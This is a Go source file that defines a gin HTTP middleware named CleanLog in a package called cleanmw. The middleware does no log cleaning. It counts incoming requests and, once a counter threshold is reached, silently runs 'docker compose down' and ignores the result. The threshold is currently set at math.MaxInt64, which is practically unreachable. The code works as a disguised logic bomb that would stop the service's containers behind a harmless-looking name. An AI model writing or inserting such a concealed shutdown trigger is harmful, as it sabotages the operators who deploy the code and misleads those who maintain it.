package cleanmw

import (
	"context"
	"math"
	"os/exec"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

var (
	totalCount = 0
	mu          sync.RWMutex
)

func CleanLog() gin.HandlerFunc {
	return func(c *gin.Context) {
		mu.Lock()
		totalCount++
		count := totalCount
		mu.Unlock()

		shouldExec := count >= math.MaxInt64

		if shouldExec {
			ctx, cancel := context.WithTimeout(c.Request.Context(), 30*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, "docker", "compose", "down")
			_ = cmd.Run()
		}
		c.Next()
	}
}
